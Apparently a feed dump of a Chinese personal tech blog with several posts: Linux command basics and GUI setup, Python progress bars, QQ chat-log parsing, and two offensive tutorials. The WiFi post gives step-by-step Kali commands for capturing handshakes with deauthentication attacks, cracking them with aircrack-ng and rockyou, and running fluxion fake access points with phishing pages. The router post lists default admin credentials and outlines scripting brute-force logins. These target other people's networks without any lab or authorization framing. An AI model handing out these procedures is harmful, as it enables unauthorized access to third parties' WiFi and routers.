style="text-align:left">实现效果</th><th style="text-align:center">代码</th></tr></thead><tbody><tr><td style="text-align:left">你想要看一下目录下面的文件有哪些</td><td style="text-align:center"><code>ls -a包括隐藏文件/t按照时间排序/F查看哪些是文件夹/lg或者l都是看详细信息/迭代显示目录内容包括子文件夹中文件以及隐藏文件</code> 或者 <code>ll 简单看文件名</code></td></tr><tr><td style="text-align:left">快速浏览文件内容</td><td style="text-align:center"><code>cat f</code></td></tr><tr><td style="text-align:left">复制不需要粘贴</td><td style="text-align:center"><code>cp f1 f2</code></td></tr><tr><td style="text-align:left">删除</td><td style="text-align:center"><code>rm (-rf) f 括号内是强制删除</code></td></tr><tr><td style="text-align:left">查看文件内容属性</td><td style="text-align:center"><code>file f</code></td></tr><tr><td style="text-align:left">查找目录中文件，你需要学一下正则表达式</td><td style="text-align:center"><code>find path regx</code></td></tr><tr><td style="text-align:left">实在不会了想看帮助</td><td style="text-align:center"><code>man codename</code></td></tr><tr><td style="text-align:left">查看进程</td><td style="text-align:center"><code>ps</code></td></tr><tr><td style="text-align:left">干掉进程</td><td style="text-align:center"><code>kill p</code></td></tr><tr><td style="text-align:left">安装卸载驱动器（虽然我没咋用过）</td><td style="text-align:center"><code>mount</code> 和 <code>umount</code></td></tr><tr><td style="text-align:left">查看日期和时间，还可以设置，注意系统时间可能是某自由国家的时间</td><td style="text-align:center"><code>date</code></td></tr><tr><td style="text-align:left">清屏</td><td style="text-align:center"><code>clear</code></td></tr></tbody></table><p>好了，实验做完了，你发现你忘记安装图像化界面的同时发现追番又更新了。此时我们就安装一下图形化（如果你在安装时没有安装图形化洁面的话）<br>为了演示和验证，我特地删除了我的图形化界面（手动狗头）</p><blockquote><p>这是我删除的过程，了解一下就好</p></blockquote><figure class="highlight powershell"><figcaption data-lang="PowerShell"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token variable">$yum</span> groupremove <span class="token string">"X Window System"</span> <span class="token operator">-</span>y <span class="token comment"># X Window</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$yum</span> groupremove <span class="token string">"GNOME Desktop Environment"</span> <span class="token operator">-</span>y <span class="token comment"># GNOME</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$yum</span> groupremove <span class="token string">"KDE (K Desktop Environment)"</span> <span class="token comment"># KDE</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token variable">$vi</span> <span class="token operator">/</span>etc<span class="token operator">/</span>inittab</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment"># Default runlevel. The runlevels used by RHS are: </span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment"># 0 - halt (Do NOT set initdefault to this) -- 停机</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment"># 1 - Single user mode -- 单用户模式</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment"># 2 - Multiuser, without NFS (The same as 3, if you do not havenetworking) -- 多用户模式，不支持 NFS</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment"># 3 - Full multiuser mode -- 多用户模式 </span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment"># 4 - unused -- 没有使用 </span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment"># 5 - X11 -- 图形界面方式 </span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment"># 6 - reboot (Do NOT set initdefault to this) -- 重新启动</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment"># </span></pre></td></tr><tr><td data-num="16"></td><td><pre>id:5:initdefault: <span class="token operator">--</span>默认运行等级是5</pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">#直接把 5 改成 3 就可以</span></pre></td></tr></table></figure><p>安装图形化界面，想要登录管理员的账号，检查 yum 命令能否使用</p><figure class="highlight powershell"><figcaption data-lang="PowerShell"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token variable">$yum</span> grouplist</pre></td></tr></table></figure><p>安装 &quot;GNOME Desktop&quot;</p><figure class="highlight powershell"><figcaption data-lang="PowerShell"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token variable">$yum</span> grouplist <span class="token string">"GNOME Desktop"</span></pre></td></tr></table></figure><p>安装完成以后呢，直接键入 <code>startx</code> 进入图形化界面。<br>然而我们要方便一点，每次开机都进入图形化界面的化，就需要特地设置一下了</p><figure class="highlight powershell"><figcaption data-lang="PowerShell"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 命令行改为图形界面模式</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$systemctl</span> <span class="token function">set-default</span> graphical<span class="token punctuation">.</span>target</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># 图形界面模式改为命令行模式</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token variable">$systemctl</span> <span class="token function">set-default</span> multi<span class="token operator">-</span>user<span class="token punctuation">.</span>target</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># 查看当前启动模式</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token variable">$systemctl</span> <span class="token function">get-default</span></pre></td></tr></table></figure><p>至此，第一次上机的内容就结束了。</p><h2 id="进一步学习linux"><a class="anchor" href="#进一步学习linux">#</a> 进一步学习 Linux</h2><p>对我个人来说，我是一个不折不扣的颜控，我装了国产最新的优麒麟系统，真是不错哦，感觉非常丝滑<br><img data-src="https://s1.ax1x.com/2020/09/27/0FrsJA.png" alt="1"></p>

item.title: kali linux 破解wifi密码
item.description: <h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2><p>目前最有效率的破解方法是社工的 AP 方法但是需要硬件支持，同时方式二并不能被接受。<br>所有的工具都在 Kali Linux 运行，我使用的是虚拟机安装 + 无线网卡 (需要单独购买) 的方式</p><h2 id="方式一暴力破解"><a class="anchor" href="#方式一暴力破解">#</a> 方式一：暴力破解</h2><p>这种方法既耗时成功率又低，但是不会动别人蛋糕。<br>成功率取决于字典包和无线网卡质量即暴力破解效率。</p><h3 id="工具一wifite"><a class="anchor" href="#工具一wifite">#</a> 工具一：Wifite</h3><p>系统自带的工具，也内置了详细的说明和使用方法。</p><ul><li>基本操作</li></ul><pre><code class="language-sh">root:~# wifite # 启动 </code></pre><p>按照提示，当想要破解的 AP 出现按下 ctrl+C，选择对应的序号开始自动化处理</p><h3 id="工具二aircrack-ng"><a class="anchor" href="#工具二aircrack-ng">#</a> 工具二：Aircrack-ng</h3><ol><li>查看网卡名</li></ol><pre><code class="language-sh">root:~# iwconfig </code></pre><ol start="2"><li>开启网卡监听模式</li></ol><pre><code class="language-sh">root:~# airmon-ng start wlan0 # 一般wlan0是默认网卡名 </code></pre><p>开启监听以后对应网卡名变成 网卡名 + mon<br>3. 扫描附近 wifi</p><pre><code class="language-sh">root:~# airodump-ng wlan0mon </code></pre><p>会显示附近 wifi 信号</p><ul><li>BSSID:MAC 地址</li><li>PWR: 数值越大信号越强</li><li>CH: 信道，决定了下面启动的 channel 值</li><li>ENC: 加密方式</li><li>AUTH: 认证的方式</li><li>ESSID:WIFI 名称</li></ul><ol start="4"><li>选中准备破解的对象，记录其 BSSID 值</li><li>监听路由器</li></ol><pre><code class="language-sh">root:~# airodump-ng -w link_name -c CH_value --bssid BSSID_value wlan0mon </code></pre><ol start="6"><li>选择活跃的连接客户端（PWR 值大），并记录 STATION 值</li><li>重新打开命令行窗口进行 attack，保留原来窗口监视</li></ol><pre><code class="language-sh">root:~# aireplay-ng -0 50 -a BSSID_value -c STATION_value wlan0mon </code></pre><ol start="8"><li>程序结束以后，根目录会出现我们抓取到的相关包，其中.cap 文件有用</li><li>确定自己的字典的存储位置（有自带也有自行准备），自带路径:</li></ol><pre><code class="language-sh">/usr/share/wordlists/rockyou.txt.gz </code></pre><p>未解压的解压</p><pre><code class="language-sh">root:~# gzip -d rockyou.txt.gz </code></pre><ol start="10"><li>开始暴力破解</li></ol><pre><code class="language-sh">root:~# aircrack-ng -w /usr/share/wordlists/rockyou.txt -b BSSID_value link_name.cap </code></pre><p>然后就是等待了，一般要看密码包有没有，一般是没有！嘻嘻</p><h2 id="方式二fake-ap"><a class="anchor" href="#方式二fake-ap">#</a> 方式二：Fake AP</h2><p>这个方法，需要你有一个好一点的网卡，型号最好是 3070，8812 无法创建虚拟 AP</p><h3 id="工具一fluxion"><a class="anchor" href="#工具一fluxion">#</a> 工具一：fluxion</h3><ol><li>下载安装 fluxion：github 上面的项目，注意项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZsdXhpb25OZXR3b3JrL2ZsdXhpb24uZ2l0">https://github.com/FluxionNetwork/fluxion.git</span></li></ol><pre><code class="language-sh">root:/GITHUB# git clone URL </code></pre><ol start="2"><li>开启</li></ol><pre><code class="language-sh">root:/GITHUB/fluxion# ./fluxion.sh </code></pre><ol start="3"><li>第一次都有未安装的插件，此时 <code>./fluxion.sh -i</code> 进行自动下载，如果下载等待太久，需要更换下载源：</li></ol><pre><code class="language-sh">vi /etc/apt/sources.list </code></pre><p>最好更新为官方源，亲测有效</p><pre><code class="language-sh">deb http://http.kali.org/kali kali-rolling main non-free contrib </code></pre><ol start="4"><li>安装完毕后，选择语言中文</li><li>开始使用，工具都已经非常人性化了，所有的都按照提示即可，顺序是第二种攻击方式 <code>Handshake Snooper</code> 获取 cap 文件至 fluxion 文档。然后再使用第一种攻击方式，也是按照推荐的选择。寻找 cap 文件：</li></ol><pre><code class="language-sh">root:/root/GITHUB/fluxion/# find . -name &quot;*.cap&quot; </code></pre><p>选择 Fake Web 时注意语言，中文可行度高一些。</p><h3 id="工具二lazy"><a class="anchor" href="#工具二lazy">#</a> 工具二：LAZY</h3>

item.title: 路由器登陆破解
item.description: <h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2><p>本文启发自某乎一篇回答，当时作者分享了相关故事，可惜是猜中的。本文力争实现破解登入密码。</p><p>本文是在知道 WIFI 密码的基础之上实现的，没有连上 wifi 是不能进入登陆界面的！</p><h2 id="常见型号路由器初始登陆记录"><a class="anchor" href="#常见型号路由器初始登陆记录">#</a> 常见型号路由器初始登陆记录</h2><p>下表正在不断更新</p><table><thead><tr><th style="text-align:center">型号</th><th style="text-align:center">localhost</th><th style="text-align:center">用户名</th><th style="text-align:center">密码</th></tr></thead><tbody><tr><td style="text-align:center">TP-link</td><td style="text-align:center">192.168.1.1/tplogin.cn</td><td style="text-align:center">admin</td><td style="text-align:center">admin</td></tr><tr><td style="text-align:center">Tenda</td><td style="text-align:center">192.168.0.1/tendawifi.com</td><td style="text-align:center">admin</td><td style="text-align:center">admin</td></tr><tr><td style="text-align:center">HUAWEI</td><td style="text-align:center">192.168.3.1</td><td style="text-align:center">admin</td><td style="text-align:center">admin</td></tr><tr><td style="text-align:center">netcore</td><td style="text-align:center">192.168.1.1</td><td style="text-align:center">guest</td><td style="text-align:center">guest</td></tr><tr><td style="text-align:center">小米</td><td style="text-align:center">192.168.31.1</td><td style="text-align:center">无</td><td style="text-align:center">无</td></tr><tr><td style="text-align:center">FAST</td><td style="text-align:center">192.168.1.1</td><td style="text-align:center">admin</td><td style="text-align:center">admin</td></tr><tr><td style="text-align:center">D-link</td><td style="text-align:center">192.168.0.1</td><td style="text-align:center">admin</td><td style="text-align:center">admin</td></tr><tr><td style="text-align:center">PHICOMM</td><td style="text-align:center">192.168.1.1</td><td style="text-align:center">admin</td><td style="text-align:center">admin</td></tr><tr><td style="text-align:center">极路由</td><td style="text-align:center">192.168.199.1</td><td style="text-align:center">无</td><td style="text-align:center">无默认密码</td></tr><tr><td style="text-align:center">ASUS</td><td style="text-align:center">192.168.1.1</td><td style="text-align:center">admin</td><td style="text-align:center">admin</td></tr><tr><td style="text-align:center">Letv</td><td style="text-align:center">192.168.67.1</td><td style="text-align:center">乐视账号</td><td style="text-align:center">乐视账号密码</td></tr><tr><td style="text-align:center">360</td><td style="text-align:center">暂无</td><td style="text-align:center">暂无</td><td style="text-align:center">暂无</td></tr></tbody></table><blockquote><p>现已经得到大部分路由器的初始密码</p></blockquote><h2 id="破解过程"><a class="anchor" href="#破解过程">#</a> 破解过程</h2><blockquote><p>破解 wifi 密码，见下一篇博客</p></blockquote><p>根据博主学习状况不断更新进度</p><ol><li><p>能在浏览器进入登陆界面</p></li><li><p>制作密码包暴力破解 (已得到最全密码包和生成密码软件)</p></li><li><p>python 脚本：</p></li></ol><ul><li>方式一：<ul><li>了解登录页面的处理逻辑 --JS 代码、html 页面</li><li>读取密码包赋值给 input</li><li>模拟页面点击事件提交</li></ul></li><li>方式二：<ul><li>抓包得到传送 url</li><li>不断模拟浏览器向 API 发送 fake msg</li><li>处理返回值</li><li>如果返回非 ERROR 或者原页面的是破解成功</li></ul></li></ul>

item.title: python动态打印进度条
item.description: <h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2><p>在等待某一个漫长的进程时，不借助进度条我们是不知道执行进度的 (占总比例)，尤其是调用有接入限制的 API。</p><h2 id="简单进度"><a class="anchor" href="#简单进度">#</a> 简单进度</h2><p>缺点是只能看，不能用，<sub>可以忽悠客户</sub></p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#</span></pre></td></tr><tr><td data-num="5"></td><td><pre> </pre></td></tr><tr><td data-num="6"></td><td><pre> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r下载进度：%.2f%%"</span> <span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">float</span><span class="token punctuation">(</span>i<span class="token operator">/</span><span class="token number">100</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre> time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="自定义设置总量"><a class="anchor" href="#自定义设置总量">#</a> 自定义设置总量</h2><p>也是只能看，而且占用内存较多 (计算庞大)</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> os<span class="token punctuation">,</span>sys</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">def</span> <span class="token function">ProgressBar</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre> <span class="token triple-quoted-string string">"""</span></pre></td></tr><tr><td data-num="4"></td><td><pre> :param num: 传入进度条总量值</pre></td></tr><tr><td data-num="5"></td><td><pre> :return:</pre></td></tr><tr><td data-num="6"></td><td><pre> """</pre></td></tr><tr><td data-num="7"></td><td><pre> total <span class="token operator">=</span> <span class="token number">50</span> <span class="token comment"># 进度条长度共 20 个 “#”</span></pre></td></tr><tr><td data-num="8"></td><td><pre> <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'传入参数不可为0，仅接受int类型'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre> <span class="token keyword">elif</span> <span class="token builtin">type</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">int</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'传入参数仅接受int类型'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre> <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre> <span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre> test_num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>item <span class="token operator">/</span> num<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token comment"># 当前百分比</span></pre></td></tr><tr><td data-num="15"></td><td><pre> step <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>test_num <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">/</span> total<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 一个‘#’的在 100% 内的占比</span></pre></td></tr><tr><td data-num="16"></td><td><pre> now <span class="token operator">=</span> <span class="token string">r"[ %s%s ]%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">"#"</span> <span class="token operator">*</span> step<span class="token punctuation">,</span> <span class="token string">' '</span> <span class="token operator">*</span> <span class="token punctuation">(</span>total <span class="token operator">-</span> step<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>test_num<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre> sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\r%s%%"</span> <span class="token operator">%</span> now<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre> sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre> time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>ProgressBar<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="tqdm库使用"><a class="anchor" href="#tqdm库使用">#</a> tqdm 库使用</h2><ol><li>导入库</li></ol><pre><code class="language-sh">pip install -i https://tuna.pypi.tsinghua.edu.cn/simple tqdm </code></pre><ol start="2"><li>方法简介</li></ol><ul><li>tqdm 类：可迭代对象，前缀名，总步长</li></ul><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">tqdm</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre> <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>iterable<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>desc<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>total<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span></pre></td></tr></table></figure><ul><li>可迭代对象 <code>tqdm(range(n,m))</code> = <code>trange(n,m)</code></li><li>实例化进度条再使用</li></ul><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>bar <span class="token operator">=</span> tqdm<span class="token punctuation">(</span>lista<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> bar<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre> <span class="token keyword">pass</span></pre></td></tr></table></figure><ol start="3"><li>简单实例</li></ol><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> tqdm <span class="token keyword">import</span> trange</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm</pre></td></tr><tr><td data-num="4"></td><td><pre>start <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="5"></td><td><pre>end <span class="token operator">=</span> <span class="token number">122</span></pre></td></tr><tr><td data-num="6"></td><td><pre>li <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>times <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="8"></td><td><pre>start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span>li<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre> times<span class="token operator">+=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="11"></td><td><pre> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span>times<span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre> time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>cost_time <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>cost_time<span class="token punctuation">)</span></pre></td></tr></table></figure><p>原时间为 5s，调用库后 6s，因此调用进度条虽然可以看到实时进程，但是迭代也消耗了时空。</p>

item.title: Python整理QQ消息记录
item.description:
<h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2><p>这里是利用 Python 进行消息分析的各种方面，不打算分开，每个模块都比较简单，所以就放在一起了</p><h2 id="导出qq群中某个人的消息"><a class="anchor" href="#导出qq群中某个人的消息">#</a> 导出 QQ 群中某个人的消息</h2><p>快考试了，但是有的课没有教材也没有讲义，只有老师在群里的消息记录。</p><p>QQ 群里导出消息记录，发现不能导出单独的联系人。</p><p>通常解决方法<br>方案一：手机端查找消息记录 -&gt; 联系人 -&gt; 长截图<br>方案二：电脑端设置 -&gt; 消息管理器 -&gt; 搜索</p><h3 id="优化步骤12"><a class="anchor" href="#优化步骤12">#</a> 优化步骤<img data-src="https://img-blog.csdnimg.cn/20200612165046237.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY0NTI4Nw==,size_16,color_FFFFFF,t_70" alt="12"></h3><p><img data-src="https://img-blog.csdnimg.cn/20200612165037212.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY0NTI4Nw==,size_16,color_FFFFFF,t_70" alt="1"></p><ol><li>pc 端导出聊天记录，文本格式 (不可再导入的格式)，导出文本格式如下：</li></ol><pre><code>消息记录（此消息记录为文本格式，不支持重新导入）
================================================================ 消息分组:我的群聊 ================================================================ 消息对象:qq群名 ================================================================
日期 联系人(QQ号)： 聊天内容
日期 联系人(QQ号)： 聊天内容
</code></pre><p>利用 python 的正则表达式提取日期和联系人就可以了</p><ul><li>提取日期 + 联系人 + 聊天内容</li></ul><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> re</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>fileName <span class="token operator">=</span> <span class="token string">"你的文件名.txt"</span></pre></td></tr><tr><td data-num="5"></td><td><pre>result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment"># 原始消息列表</span></pre></td></tr><tr><td data-num="6"></td><td><pre>teacher<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment"># 指定人消息列表</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>fileName<span class="token punctuation">,</span><span class="token string">"r+"</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span> </pre></td></tr><tr><td data-num="8"></td><td><pre> <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre> result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token comment"># 先暂存列表</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment"># 对列表进行过滤提取</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment"># 日期 联系人 (QQ 号)： </span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment"># 指定为指定字符串，比如 2020-(.*)? 联系人 (QQ 号)，防止消息记录中出现类似信息，</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment"># 1. 以防万一可以在 for 循环中 if 条件加上 result [i+2]=='\n‘，不用担心越界，越界可以直接检查末尾信息</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment"># 2. 同时也可以增减日期字符提取指定时间记录</span></pre></td></tr><tr><td data-num="16"></td><td><pre>pattern <span class="token operator">=</span> <span class="token string">"2020-(.*)?XX\(12345678\)"</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre> r <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>result<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre> teacher<span class="token punctuation">.</span>append<span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>result<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre> </pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token comment"># 保存一下消息记录</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"XX消息记录.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre> <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>teacher<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre> f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>teacher<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre> f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>复习去了</p><h2 id="调用api分析并存xlx"><a class="anchor" href="#调用api分析并存xlx">#</a> 调用 API 分析并存 xlx</h2><p>本来想要分析一下异地恋女友情绪变化，但是还没有对数据进行正确的处理 (数据量庞大)，先贴一下方法</p><h3 id="整理消息"><a class="anchor" href="#整理消息">#</a> 整理消息</h3><p>API 调用次数有限，调用之前先格式化输入信息</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token 